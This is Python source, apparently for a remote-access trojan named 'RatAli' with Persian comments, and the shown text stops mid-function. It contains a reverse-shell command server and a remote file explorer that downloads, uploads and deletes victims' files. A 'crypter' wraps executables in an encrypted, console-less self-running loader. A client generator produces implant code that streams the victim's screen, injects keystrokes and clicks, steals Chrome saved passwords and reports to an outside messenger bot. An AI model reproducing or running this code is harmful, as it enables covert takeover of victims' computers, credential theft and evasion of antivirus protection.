import io
from flask import Flask, Response, request, jsonify, render_template
import socket
import subprocess
import threading
import logging
import os
import sys
import base64
import random
import win32gui
import win32con
import win32api
import win32com.client
import pythoncom
from PIL import Image
import time
from PyQt5 import QtWidgets, QtCore, QtGui
from PyQt5.QtWidgets import (QMainWindow, QTreeView, QVBoxLayout, QWidget, QMenu, QAction, 
                             QInputDialog, QMessageBox, QFileDialog, QToolBar, QPushButton, 
                             QLineEdit, QTextEdit, QDialog)
from PyQt5.QtGui import QStandardItemModel, QStandardItem, QIcon, QFont
from PyQt5.QtCore import Qt
import tkinter as tk
from tkinter import filedialog as fd, Tk, messagebox
from pathlib import Path
from functools import partial
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import json
import shutil

# تنظیمات لاگ‌گیری
logging.basicConfig(filename='server_combined.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# تنظیمات Flask برای ریموت دسکتاپ
global STATE
STATE = {}
app = Flask(__name__)

# تنظیمات سوکت‌ها
HOST = '0.0.0.0'  # فقط برای گوش دادن
PORT = 9999
SHELL_PORT = 8888
FILE_PORT = 65432

# متغیرهای سراسری
flask_thread = None
remote_active = False
file_explorer_active = False
clients = {}
client_counter = 0
server_socket = None
listening_thread = None
file_explorer_thread = None
file_explorer_instance = None

# ------------------- بخش ریموت دسکتاپ (Flask) -------------------
@app.route('/')
def root():
    return render_template('/index.html')

@app.route('/rd', methods=['POST'])
def rd():
    req = request.get_json()
    key = req['_key']
    if req['filename'] == STATE[key]['filename']:
        attachment = b''
    else:
        attachment = STATE[key]['im']
    resp = Response(attachment, mimetype='application/octet-stream')
    resp.headers['filename'] = STATE[key]['filename']
    return resp

@app.route('/event_post', methods=['POST'])
def event_post():
    global STATE
    req = request.get_json()
    key = req['_key']
    STATE[key]['events'].append(request.get_json())
    return jsonify({'ok': True})

@app.route('/new_session', methods=['POST'])
def new_session():
    global STATE
    req = request.get_json()
    key = req['_key']
    STATE[key] = {'im': b'', 'filename': 'none.png', 'events': []}
    return jsonify({'ok': True})

@app.route('/capture_post', methods=['POST'])
def capture_post():
    global STATE
    with io.BytesIO() as image_data:
        filename = list(request.files.keys())[0]
        key = filename.split('_')[1]
        request.files[filename].save(image_data)
        STATE[key]['im'] = image_data.getvalue()
        STATE[key]['filename'] = filename
    return jsonify({'ok': True})

@app.route('/events_get', methods=['POST'])
def events_get():
    req = request.get_json()
    key = req['_key']
    events_to_execute = STATE[key]['events'].copy()
    STATE[key]['events'] = []
    return jsonify({'events': events_to_execute})

# ------------------- بخش رمزنگاری -------------------
class SelfDecryptingEncryptor:
    def __init__(self):
        self.backend = default_backend()
        self.aes_key_size = 32

    def generate_aes_key(self):
        return os.urandom(self.aes_key_size)

    def save_key(self, key, filename):
        try:
            with open(filename, 'wb') as f:
                f.write(key)
            logging.info(f"Key saved to {filename}")
        except Exception as e:
            logging.error(f"Error saving key: {str(e)}")
            raise

    def encrypt_file(self, input_file, output_file, aes_key):
        try:
            with open(input_file, 'rb') as f:
                data = f.read()
            logging.info(f"File {input_file} read successfully")

            nonce = os.urandom(12)
            cipher = Cipher(algorithms.AES(aes_key), modes.GCM(nonce), backend=self.backend)
            encryptor = cipher.encryptor()
            ciphertext = encryptor.update(data) + encryptor.finalize()
            tag = encryptor.tag

            with open(output_file, 'wb') as f:
                f.write(nonce + tag + ciphertext)
            logging.info(f"Encrypted file saved to {output_file}")
            return nonce, tag, nonce + tag + ciphertext
        except Exception as e:
            logging.error(f"Error encrypting file: {str(e)}")
            raise

    def create_loader(self, encrypted_data, aes_key, output_loader):
        encrypted_data_b64 = base64.b64encode(encrypted_data).decode('utf-8')
        loader_code = f"""
import os
import sys
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import subprocess
import tempfile

def decrypt_and_execute(encrypted_data, aes_key, nonce, tag):
    backend = default_backend()
    cipher = Cipher(algorithms.AES(aes_key), modes.GCM(nonce, tag), backend=backend)
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
    
    with tempfile.NamedTemporaryFile(delete=False, suffix='.exe') as temp_file:
        temp_file.write(decrypted_data)
        temp_file_path = temp_file.name
    
    try:
        subprocess.run(temp_file_path, shell=True)
    finally:
        os.remove(temp_file_path)

if __name__ == "__main__":
    encrypted_data_b64 = "{encrypted_data_b64}"
    data = base64.b64decode(encrypted_data_b64)
    nonce = data[:12]
    tag = data[12:28]
    ciphertext = data[28:]
    aes_key = "{aes_key.hex()}"
    aes_key = bytes.fromhex(aes_key)
    decrypt_and_execute(ciphertext, aes_key, nonce, tag)
"""
        try:
            with open(output_loader, 'w', encoding='utf-8') as f:
                f.write(loader_code)
            logging.info(f"Loader created at {output_loader}")
        except Exception as e:
            logging.error(f"Error creating loader: {str(e)}")
            raise

class CryptGUIApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Self-Decrypting EXE Generator")
        self.root.geometry("500x400")
        self.encryptor = SelfDecryptingEncryptor()

        self.input_file = tk.StringVar()
        self.output_file = tk.StringVar(value="output.exe")
        self.icon_file = tk.StringVar()

        self.create_widgets()

    def create_widgets(self):
        tk.Label(self.root, text="Input EXE File:").grid(row=0, column=0, padx=10, pady=5, sticky="w")
        tk.Entry(self.root, textvariable=self.input_file, width=40).grid(row=0, column=1, padx=10, pady=5)
        tk.Button(self.root, text="Browse", command=self.browse_input).grid(row=0, column=2, padx=10, pady=5)

        tk.Label(self.root, text="Output EXE Name:").grid(row=1, column=0, padx=10, pady=5, sticky="w")
        tk.Entry(self.root, textvariable=self.output_file, width=40).grid(row=1, column=1, padx=10, pady=5)
        tk.Label(self.root, text="Default: output.exe").grid(row=1, column=2, padx=10, pady=5)

        tk.Label(self.root, text="Icon File (.ico):").grid(row=2, column=0, padx=10, pady=5, sticky="w")
        tk.Entry(self.root, textvariable=self.icon_file, width=40).grid(row=2, column=1, padx=10, pady=5)
        tk.Button(self.root, text="Browse", command=self.browse_icon).grid(row=2, column=2, padx=10, pady=5)

        tk.Button(self.root, text="Generate EXE", command=self.generate_exe).grid(row=3, column=0, columnspan=3, pady=20)

        self.status_label = tk.Label(self.root, text="", wraplength=400)
        self.status_label.grid(row=4, column=0, columnspan=3, padx=10, pady=5)

    def browse_input(self):
        file_path = fd.askopenfilename(filetypes=[("EXE files", "*.exe")])
        if file_path:
            self.input_file.set(file_path)

    def browse_icon(self):
        file_path = fd.askopenfilename(filetypes=[("Icon files", "*.ico")])
        if file_path:
            self.icon_file.set(file_path)

    def generate_exe(self):
        input_file = self.input_file.get()
        output_file = self.output_file.get()
        icon_file = self.icon_file.get()

        if not input_file:
            messagebox.showerror("Error", "Please select an input EXE file.")
            return
        if not output_file.endswith(".exe"):
            output_file += ".exe"

        self.status_label.config(text="Processing... Please wait.")
        self.root.update()

        try:
            encrypted_file = "encrypted.enc"
            loader_file = "loader.py"

            aes_key = self.encryptor.generate_aes_key()
            self.encryptor.save_key(aes_key, "aes_key.key")
            nonce, tag, encrypted_data = self.encryptor.encrypt_file(input_file, encrypted_file, aes_key)
            self.encryptor.create_loader(encrypted_data, aes_key, loader_file)

            pyinstaller_cmd = ["pyinstaller", "--onefile", "--noconsole"]
            if icon_file:
                pyinstaller_cmd.extend(["--icon", icon_file])
            pyinstaller_cmd.append(loader_file)

            subprocess.run(pyinstaller_cmd, check=True)

            final_exe = os.path.join("dist", "loader.exe")
            if os.path.exists(final_exe):
                os.replace(final_exe, output_file)
                logging.info(f"Final EXE created at {output_file}")
                self.status_label.config(text=f"Success! EXE created at {output_file}")
                messagebox.showinfo("Success", f"EXE created successfully at {output_file}")
            else:
                raise Exception("Final EXE not found in dist/")

        except Exception as e:
            logging.error(f"Error generating EXE: {str(e)}")
            self.status_label.config(text=f"Error: {str(e)}")
            messagebox.showerror("Error", f"Failed to generate EXE: {str(e)}")

        finally:
            for temp_file in [encrypted_file, loader_file, "loader.spec"]:
                if os.path.exists(temp_file):
                    os.remove(temp_file)
            for temp_dir in ["dist", "build", "__pycache__"]:
                if os.path.exists(temp_dir):
                    shutil.rmtree(temp_dir, ignore_errors=True)
            self.root.quit()

def execute_crypt_command():
    root = Tk()
    app = CryptGUIApp(root)
    root.mainloop()

# ------------------- بخش Remote File Explorer -------------------
class RemoteFileExplorer(QMainWindow):
    def __init__(self, client_socket, current_path="C:\\"):
        super().__init__()
        self.setWindowTitle("Remote File Explorer - RatAli")
        self.setGeometry(100, 100, 800, 600)
        self.setStyleSheet("background-color: #d0d0d0;")
        self.client_socket = client_socket
        self.current_path = current_path
        self.path_history = []
        self.forward_history = []
        self.init_ui()

    def init_ui(self):
        toolbar = QToolBar()
        self.addToolBar(toolbar)
        
        back_button = QPushButton("Back")
        back_button.clicked.connect(self.go_back)
        back_button.setStyleSheet("background-color: #e0e0e0; color: black; border: 1px solid #a0a0a0;")
        toolbar.addWidget(back_button)

        forward_button = QPushButton("Forward")
        forward_button.clicked.connect(self.go_forward)
        forward_button.setStyleSheet("background-color: #e0e0e0; color: black; border: 1px solid #a0a0a0;")
        toolbar.addWidget(forward_button)

        up_button = QPushButton("Up")
        up_button.clicked.connect(self.go_up)
        up_button.setStyleSheet("background-color: #e0e0e0; color: black; border: 1px solid #a0a0a0;")
        toolbar.addWidget(up_button)

        self.address_bar = QLineEdit(self.current_path)
        self.address_bar.returnPressed.connect(self.go_to_path)
        self.address_bar.setStyleSheet("background-color: white; color: black; border: 1px solid #a0a0a0;")
        toolbar.addWidget(self.address_bar)

        self.tree = QTreeView()
        self.model = QStandardItemModel()
        self.model.setHorizontalHeaderLabels(["Name", "Type", "Size (bytes)"])
        self.tree.setModel(self.model)
        self.tree.setColumnWidth(0, 400)
        self.tree.setColumnWidth(1, 100)
        self.tree.setColumnWidth(2, 100)
        self.tree.setStyleSheet("background-color: white; color: black; border: 1px solid #a0a0a0;")
        self.tree.setFont(QFont("Segoe UI", 10))
        self.tree.setContextMenuPolicy(Qt.CustomContextMenu)
        self.tree.customContextMenuRequested.connect(self.context_menu)
        self.tree.doubleClicked.connect(self.on_double_click)

        layout = QVBoxLayout()
        layout.addWidget(self.tree)
        container = QWidget()
        container.setLayout(layout)
        self.setCentralWidget(container)

        self.refresh_file_list()

    def refresh_file_list(self):
        try:
            self.client_socket.sendall(b"LIST")
            self.client_socket.sendall(self.current_path.encode('utf-8'))
            size_data = b""
            while b'\n' not in size_data:
                size_data += self.client_socket.recv(1)
            data_size = int(size_data.decode('utf-8').strip())
            data = b""
            while len(data) < data_size:
                data += self.client_socket.recv(min(data_size - len(data), 4096))
            files = json.loads(data.decode('utf-8'))

            self.model.removeRows(0, self.model.rowCount())
            for file in files:
                name_item = QStandardItem(file['name'])
                type_item = QStandardItem("Folder" if file['is_dir'] else "File")
                size_item = QStandardItem(str(file['size']) if not file['is_dir'] else "")
                name_item.setData(file['path'], Qt.UserRole)
                name_item.setIcon(self.get_system_icon(file['path'], file['is_dir']))
                self.model.appendRow([name_item, type_item, size_item])
            self.address_bar.setText(self.current_path)
        except Exception as e:
            print(f"Error refreshing file list: {e}")

    def get_system_icon(self, file_path, is_dir):
        try:
            flags = win32con.SHGFI_ICON | win32con.SHGFI_SMALLICON
            if is_dir:
                file_path = "folder"
            hicon = win32gui.SHGetFileInfo(file_path, 0, flags)[0]
            icon = QIcon()
            icon.addPixmap(win32gui.IconToPixmap(hicon))
            win32gui.DestroyIcon(hicon)
            return icon
        except Exception:
            return QIcon.fromTheme("folder" if is_dir else "text-x-generic")

    def go_back(self):
        if self.path_history:
            self.forward_history.append(self.current_path)
            self.current_path = self.path_history.pop()
            self.refresh_file_list()

    def go_forward(self):
        if self.forward_history:
            self.path_history.append(self.current_path)
            self.current_path = self.forward_history.pop()
            self.refresh_file_list()

    def go_up(self):
        parent_dir = os.path.dirname(self.current_path.rstrip('\\'))
        if parent_dir != self.current_path:
            self.path_history.append(self.current_path)
            self.current_path = parent_dir
            self.refresh_file_list()

    def go_to_path(self):
        new_path = self.address_bar.text()
        if os.path.exists(new_path.replace('/', '\\')):
            self.path_history.append(self.current_path)
            self.current_path = new_path
            self.refresh_file_list()
        else:
            QMessageBox.warning(self, "Error", "Invalid path!")

    def on_double_click(self, index):
        try:
            item = self.model.itemFromIndex(index)
            if item.column() == 0:
                file_path = item.data(Qt.UserRole)
                if os.path.isdir(file_path.replace('/', '\\')):
                    self.path_history.append(self.current_path)
                    self.forward_history.clear()
                    self.current_path = file_path
                    self.refresh_file_list()
        except Exception as e:
            print(f"Double-click error: {e}")

    def context_menu(self, position):
        menu = QMenu()
        download_action = QAction("Download", self)
        upload_action = QAction("Upload", self)
        delete_action = QAction("Delete", self)
        new_dir_action = QAction("Create Folder", self)
        rename_action = QAction("Rename", self)
        copy_action = QAction("Copy", self)
        move_action = QAction("Move", self)
        read_action = QAction("Read File", self)

        menu.addAction(download_action)
        menu.addAction(upload_action)
        menu.addAction(delete_action)
        menu.addAction(new_dir_action)
        menu.addAction(rename_action)
        menu.addAction(copy_action)
        menu.addAction(move_action)
        menu.addAction(read_action)

        download_action.triggered.connect(self.download_file)
        upload_action.triggered.connect(self.upload_file)
        delete_action.triggered.connect(self.delete_file)
        new_dir_action.triggered.connect(self.create_directory)
        rename_action.triggered.connect(self.rename_file)
        copy_action.triggered.connect(self.copy_file)
        move_action.triggered.connect(self.move_file)
        read_action.triggered.connect(self.read_file)

        menu.exec_(self.tree.viewport().mapToGlobal(position))

    def download_file(self):
        try:
            index = self.tree.currentIndex()
            file_path = self.model.itemFromIndex(index.sibling(index.row(), 0)).data(Qt.UserRole)
            if os.path.isdir(file_path):
                QMessageBox.warning(self, "Error", "Only files can be downloaded!")
                return
            self.client_socket.sendall(b"DOWNLOAD")
            self.client_socket.sendall(file_path.encode('utf-8'))
            size_data = b""
            while b'\n' not in size_data:
                size_data += self.client_socket.recv(1)
            data_size = int(size_data.decode('utf-8').strip())
            data = b""
            while len(data) < data_size:
                data += self.client_socket.recv(min(data_size - len(data), 4096))
            with open(f"downloaded_{os.path.basename(file_path)}", 'wb') as f:
                f.write(data)
            QMessageBox.information(self, "Success", "File downloaded!")
        except Exception as e:
            print(f"Download error: {e}")

    def upload_file(self):
        try:
            file_path, _ = QFileDialog.getOpenFileName(self, "Select a file")
            if file_path:
                self.client_socket.sendall(b"UPLOAD")
                self.client_socket.sendall(os.path.join(self.current_path, os.path.basename(file_path)).encode('utf-8'))
                with open(file_path, 'rb') as f:
                    file_data = f.read()
                    self.client_socket.sendall(str(len(file_data)).encode('utf-8') + b'\n')
                    self.client_socket.sendall(file_data)
                self.client_socket.recv(1024)
                self.refresh_file_list()
                QMessageBox.information(self, "Success", "File uploaded!")
        except Exception as e:
            print(f"Upload error: {e}")

    def delete_file(self):
        try:
            index = self.tree.currentIndex()
            file_path = self.model.itemFromIndex(index.sibling(index.row(), 0)).data(Qt.UserRole)
            self.client_socket.sendall(b"DELETE")
            self.client_socket.sendall(file_path.encode('utf-8'))
            self.client_socket.recv(1024)
            self.refresh_file_list()
            QMessageBox.information(self, "Success", "File/folder deleted!")
        except Exception as e:
            print(f"Delete error: {e}")

    def create_directory(self):
        try:
            dir_name, ok = QInputDialog.getText(self, "Create Folder", "Enter folder name:")
            if ok and dir_name:
                self.client_socket.sendall(b"CREATE_DIR")
                self.client_socket.sendall(os.path.join(self.current_path, dir_name).encode('utf-8'))
                self.client_socket.recv(1024)
                self.refresh_file_list()
                QMessageBox.information(self, "Success", "Folder created!")
        except Exception as e:
            print(f"Create dir error: {e}")

    def rename_file(self):
        try:
            index = self.tree.currentIndex()
            old_path = self.model.itemFromIndex(index.sibling(index.row(), 0)).data(Qt.UserRole)
            new_name, ok = QInputDialog.getText(self, "Rename", "Enter new name:")
            if ok and new_name:
                new_path = os.path.join(os.path.dirname(old_path), new_name)
                self.client_socket.sendall(b"RENAME")
                self.client_socket.sendall(json.dumps({'old_path': old_path, 'new_path': new_path}).encode('utf-8'))
                self.client_socket.recv(1024)
                self.refresh_file_list()
                QMessageBox.information(self, "Success", "Name changed!")
        except Exception as e:
            print(f"Rename error: {e}")

    def copy_file(self):
        try:
            index = self.tree.currentIndex()
            src = self.model.itemFromIndex(index.sibling(index.row(), 0)).data(Qt.UserRole)
            dst, ok = QInputDialog.getText(self, "Copy", "Enter destination:")
            if ok and dst:
                self.client_socket.sendall(b"COPY")
                self.client_socket.sendall(json.dumps({'src': src, 'dst': dst}).encode('utf-8'))
                self.client_socket.recv(1024)
                self.refresh_file_list()
                QMessageBox.information(self, "Success", "File/folder copied!")
        except Exception as e:
            print(f"Copy error: {e}")

    def move_file(self):
        try:
            index = self.tree.currentIndex()
            src = self.model.itemFromIndex(index.sibling(index.row(), 0)).data(Qt.UserRole)
            dst, ok = QInputDialog.getText(self, "Move", "Enter destination:")
            if ok and dst:
                self.client_socket.sendall(b"MOVE")
                self.client_socket.sendall(json.dumps({'src': src, 'dst': dst}).encode('utf-8'))
                self.client_socket.recv(1024)
                self.refresh_file_list()
                QMessageBox.information(self, "Success", "File/folder moved!")
        except Exception as e:
            print(f"Move error: {e}")

    def read_file(self):
        try:
            index = self.tree.currentIndex()
            file_path = self.model.itemFromIndex(index.sibling(index.row(), 0)).data(Qt.UserRole)
            if os.path.isdir(file_path):
                QMessageBox.warning(self, "Error", "Only files can be read!")
                return
            self.client_socket.sendall(b"READ")
            self.client_socket.sendall(file_path.encode('utf-8'))
            size_data = b""
            while b'\n' not in size_data:
                size_data += self.client_socket.recv(1)
            data_size = int(size_data.decode('utf-8').strip())
            data = b""
            while len(data) < data_size:
                data += self.client_socket.recv(min(data_size - len(data), 4096))
            content = data.decode('utf-8')

            dialog = QDialog(self)
            dialog.setWindowTitle("File Content")
            dialog.resize(400, 300)
            text_edit = QTextEdit(dialog)
            text_edit.setReadOnly(True)
            text_edit.setText(content)
            layout = QVBoxLayout()
            layout.addWidget(text_edit)
            dialog.setLayout(layout)
            dialog.exec_()
        except Exception as e:
            print(f"Read error: {e}")

    def closeEvent(self, event):
        global file_explorer_active
        file_explorer_active = False
        if self.client_socket:
            self.client_socket.sendall(b"STOP_FILE")
        event.accept()

# ------------------- بخش اجرای دستورات شل و سرور -------------------
def start_flask_server():
    global remote_active
    remote_active = True
    app.run(host=HOST, port=PORT, debug=False, use_reloader=False)

def stop_flask_server():
    global flask_thread, remote_active
    remote_active = False
    if flask_thread:
        flask_thread.join(timeout=1.0)
        flask_thread = None
    logging.info("Flask server stopped.")
    print("Flask server stopped.")

def handle_shell_client(client_socket, client_address):
    global client_counter, clients
    try:
        client_counter += 1
        client_name = f"shellsys_{client_counter}"
        clients[client_name] = {'socket': client_socket, 'active': False, 'ip': client_address[0]}  # ذخیره IP کلاینت
        logging.info(f"Shell client {client_address} connected as {client_name}.")
        print(f"Shell client {client_address} connected as {client_name}.")

        while True:
            current_dir = client_socket.recv(4096).decode()
            if not current_dir:
                print(f"Shell client {client_name} disconnected.")
                logging.info(f"Shell client {client_name} disconnected.")
                break
            clients[client_name]['current_dir'] = current_dir

    except Exception as e:
        logging.error(f"Error with shell client {client_name}: {e}")
        print(f"Error with shell client {client_name}: {e}")
    finally:
        client_socket.close()
        if client_name in clients:
            del clients[client_name]
        logging.info(f"Connection with shell client {client_name} closed.")
        print(f"Connection with shell client {client_name} closed.")
def interact_with_client(client_name, client_socket):
    global remote_active, flask_thread, file_explorer_active, file_explorer_instance
    try:
        client_socket.settimeout(30)  # افزایش تایم‌اوت به 30 ثانیه
        while True:
            command = input(f"{clients[client_name]['current_dir']}> ").strip()
            if not command:
                print("Error: Please type a command.")
                client_socket.send("No command entered.".encode())
                continue

            if command.lower() in ["clear", "cls"]:
                os.system("cls" if os.name == "nt" else "clear")
                client_socket.send("Screen cleared.".encode())
                continue

            if command.lower() == 'screenshare':
                if not remote_active:
                    client_socket.send("Starting screenshare...".encode())
                    flask_thread = threading.Thread(target=start_flask_server, daemon=True)
                    flask_thread.start()
                    client_socket.send("screenshare".encode())
                    logging.info(f"Screenshare started on {HOST}:{PORT}")
                    print(f"Screenshare started on {HOST}:{PORT}")
                else:
                    print("Screenshare is already active.")
                    client_socket.send("Screenshare is already active.".encode())
                continue

            if command.lower() == 'stop':
                if remote_active:
                    stop_flask_server()
                    client_socket.send("stop".encode())
                    logging.info("Screenshare stopped.")
                    print("Screenshare stopped.")
                else:
                    print("Screenshare is not active.")
                    client_socket.send("Screenshare is not active.".encode())
                continue

            if command.lower() == 'passwdext':
                client_socket.send("passwdext".encode())
                continue

            if command.lower() == 'rfe':
                if not file_explorer_active:
                    try:
                        client_socket.send("Starting remote file explorer...".encode())
                        client_ip = clients[client_name]['ip']
                        print(f"Attempting to connect to {client_ip}:{FILE_PORT}...")
                        time.sleep(2)  # تأخیر برای اطمینان از آماده بودن کلاینت
                        file_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        file_socket.connect((client_ip, FILE_PORT))
                        file_explorer_active = True

                        # اجرای RemoteFileExplorer در ترد اصلی
                        app = QtWidgets.QApplication(sys.argv) if not QtWidgets.QApplication.instance() else QtWidgets.QApplication.instance()
                        file_explorer_instance = RemoteFileExplorer(file_socket)
                        file_explorer_instance.show()
                        print(f"Remote File Explorer started for {client_name} on {client_ip}:{FILE_PORT}")
                        client_socket.send("rfe".encode())
                        app.exec_()  # حلقه رویداد در ترد اصلی

                    except Exception as e:
                        print(f"Error starting Remote File Explorer: {e}")
                        client_socket.send(f"Error starting RFE: {e}".encode())
                        if 'file_socket' in locals():
                            file_socket.close()
                else:
                    print("Remote File Explorer is already active.")
                    client_socket.send("Remote File Explorer is already active.".encode())
                continue

            if command.lower() == 'stop_file':
                if file_explorer_active:
                    file_explorer_active = False
                    if file_explorer_instance:
                        file_explorer_instance.close()
                    print("Remote File Explorer stopped.")
                    client_socket.send("stop_file".encode())
                else:
                    print("Remote File Explorer is not active.")
                    client_socket.send("Remote File Explorer is not active.".encode())
                continue

            if command.lower() == 'exit':
                clients[client_name]['active'] = False
                print(f"Disconnected from {client_name}.")
                break

            client_socket.send(command.encode())
            response = ""
            while True:
                try:
                    data = client_socket.recv(4096).decode()
                    if not data:
                        break
                    response += data
                    if len(data) < 4096:
                        break
                except socket.timeout:
                    print("Response timed out, continuing...")
                    break
                except Exception as e:
                    logging.error(f"Error receiving response from {client_name}: {e}")
                    break

            print(response if response else "No response from client.")

    except Exception as e:
        logging.error(f"Error interacting with {client_name}: {e}")
        print(f"Error interacting with {client_name}: {e}")
        clients[client_name]['active'] = False

def start_shell_server(port):
    global server_socket, listening_thread, SHELL_PORT
    SHELL_PORT = port
    if server_socket:
        server_socket.close()
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST, SHELL_PORT))
    server_socket.listen(5)
    logging.info(f"Shell server started on {HOST}:{SHELL_PORT}")
    print(f"Shell server started on {HOST}:{SHELL_PORT}")

    while True:
        client_socket, client_address = server_socket.accept()
        client_thread = threading.Thread(target=handle_shell_client, args=(client_socket, client_address))
        client_thread.start()

def change_listening_port(new_port):
    global listening_thread, SHELL_PORT
    if listening_thread:
        print(f"Changing listening port from {SHELL_PORT} to {new_port}...")
        server_socket.close()
        listening_thread.join()
    SHELL_PORT = int(new_port)
    listening_thread = threading.Thread(target=start_shell_server, args=(SHELL_PORT,), daemon=True)
    listening_thread.start()

def create_new_client_with_params(client_name, ip, shell_port, default_key, token, chat_id):
    global SHELL_PORT, FILE_PORT
    print(f"Creating new client {client_name}...")

    if shell_port != SHELL_PORT:
        change_listening_port(shell_port)

    client_code = f"""
import win32gui
import win32ui
import win32con
import win32api
import win32com.client
import pythoncom
from PIL import Image
import io
import requests
import time
import socket
import subprocess
import os
import threading
import re
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil

DEFAULT_HOST = '{ip}'
DEFAULT_KEY = '{default_key}'
SHELL_PORT = {shell_port}
FILE_PORT = {FILE_PORT}
TOKEN = '{token}'
CHAT_ID = '{chat_id}'
API_URL = "https://eitaayar.ir/api"

CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State" % os.environ['USERPROFILE'])
CHROME_PATH = os.path.normpath(r"%s\\AppData\\Local\\Google\\Chrome\\User Data" % os.environ['USERPROFILE'])

remote_thread = None
remote_active = False
file_thread = None
file_active = False

def send_to_eita(message):
    url = f"{{API_URL}}/{{TOKEN}}/sendMessage"
    payload = {{"chat_id": CHAT_ID, "text": message}}
    try:
        requests.post(url, json=payload)
    except Exception:
        pass

def remote_desktop_main(host, key):
    global remote_active
    try:
        pythoncom.CoInitialize()
        r = requests.post(host+'/new_session', json={{'_key': key}})
        if r.status_code != 200:
            return
        shell = win32com.client.Dispatch('WScript.Shell')
        PREV_IMG = None
        while remote_active:
            hdesktop = win32gui.GetDesktopWindow()
            width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
            height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
            left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
            top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
            desktop_dc = win32gui.GetWindowDC(hdesktop)
            img_dc = win32ui.CreateDCFromHandle(desktop_dc)
            mem_dc = img_dc.CreateCompatibleDC()
            screenshot = win32ui.CreateBitmap()
            screenshot.CreateCompatibleBitmap(img_dc, width, height)
            mem_dc.SelectObject(screenshot)
            bmpinfo = screenshot.GetInfo()
            mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
            bmpstr = screenshot.GetBitmapBits(True)
            pillow_img = Image.frombytes('RGB', (bmpinfo['bmWidth'], bmpinfo['bmHeight']), bmpstr, 'raw', 'BGRX')
            with io.BytesIO() as image_data:
                pillow_img.save(image_data, 'PNG')
                image_data_content = image_data.getvalue()
            if image_data_content != PREV_IMG:
                files = {{}}
                filename = str(round(time.time()*1000))+'_'+key
                files[filename] = ('img.png', image_data_content, 'multipart/form-data')
                try:
                    r = requests.post(host+'/capture_post', files=files)
                except Exception:
                    pass
                PREV_IMG = image_data_content
            try:
                r = requests.post(host+'/events_get', json={{'_key': key}})
                data = r.json()
                for e in data['events']:
                    if e['type'] == 'click':
                        win32api.SetCursorPos((e['x'], e['y']))
                        time.sleep(0.05)
                        win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, e['x'], e['y'], 0, 0)
                        time.sleep(0.02)
                        win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, e['x'], e['y'], 0, 0)
                    elif e['type'] == 'right_click':
                        win32api.SetCursorPos((e['x'], e['y']))
                        time.sleep(0.05)
                        win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTDOWN, e['x'], e['y'], 0, 0)
                        time.sleep(0.02)
                        win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTUP, e['x'], e['y'], 0, 0)
                    elif e['type'] == 'keydown':
                        cmd = ''
                        if e['shiftKey']:
                            cmd += '+'
                        if e['ctrlKey']:
                            cmd += '^'
                        if e['altKey']:
                            cmd += '%'
                        if len(e['key']) == 1:
                            cmd += e['key'].lower()
                        elif e['key'] == 'Win':
                            win32api.keybd_event(win32con.VK_LWIN, 0, 0, 0)
                            time.sleep(0.1)
                            win32api.keybd_event(win32con.VK_LWIN, 0, win32con.KEYEVENTF_KEYUP, 0)
                        elif e['key'] == 'RightClick':
                            hwnd = win32gui.GetForegroundWindow()
                            x, y = win32api.GetCursorPos()
                            win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTDOWN, x, y, 0, 0)
                            time.sleep(0.02)
                            win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTUP, x, y, 0, 0)
                        else:
                            cmd += '{{'+e['key'].upper()+'}}'
                        if cmd:
                            shell.SendKeys(cmd)
                    elif e['type'] == 'close_window':
                        hwnd = win32gui.GetForegroundWindow()
                        if hwnd:
                            win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
            except Exception:
                pass
            mem_dc.DeleteDC()
            win32gui.DeleteObject(screenshot.GetHandle())
            time.sleep(0.1)
    except Exception:
        pass
    finally:
        pythoncom.CoUninitialize()

def start_remote_desktop():
    global remote_active, remote_thread
    remote_active = True
    remote_thread = threading.Thread(target=remote_desktop_main, args=(f'http://{{DEFAULT_HOST}}:9999', DEFAULT_KEY))
    remote_thread.start()

def stop_remote_desktop():
    global remote_active, remote_thread
    remote_active = False
    if remote_thread:
        remote_thread.join()
        remote_thread = None

def get_secret_key():
    try:
        with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception:
        return None

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()
        return decrypted_pass
    except Exception:
        return ""

def get_db_connection(chrome_path_login_db):
    try:
        shutil.copy2(chrome_path_login_db, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception:
        return None

def extract_passwords(client_socket):
    try:
        secret_key = get_secret_key()
        folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", element) != None]
        for folder in folders:
